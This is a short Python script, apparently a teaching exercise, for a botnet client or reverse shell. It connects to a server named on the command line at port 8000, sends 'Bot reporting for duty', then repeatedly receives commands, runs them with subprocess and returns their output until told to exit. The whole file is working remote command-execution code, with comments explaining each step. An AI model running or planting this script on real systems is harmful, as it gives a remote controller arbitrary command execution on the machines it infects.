import sys
from subprocess import Popen, PIPE
from socket import *

#getIP Address from command line prompt
serverName = sys.argv[1]
serverPort = 8000

#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
clientSocket  = socket(AF_INET, SOCK_STREAM)
#supply server and port via a unmodified tuple
clientSocket.connect((serverName, serverPort))
#encode the message into binary
clientSocket.send('Bot reporting for duty'.encode())
#decode any command received as binary back into a string with the max bytes to read 4064
command = clientSocket.recv(4064).decode()
print(command)

#if the command is not exit
while command != "exit":
	#create a subprocess, and execute the command
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
	#read the results of the command
	result, err = proc.communicate()
	#send the result to the server
	clientSocket.send(result)
	#decode any command received as binary back into a string with the max bytes to read 4064
	command = (clientSocket.recv(4064)).decode()

clientSocket.close()
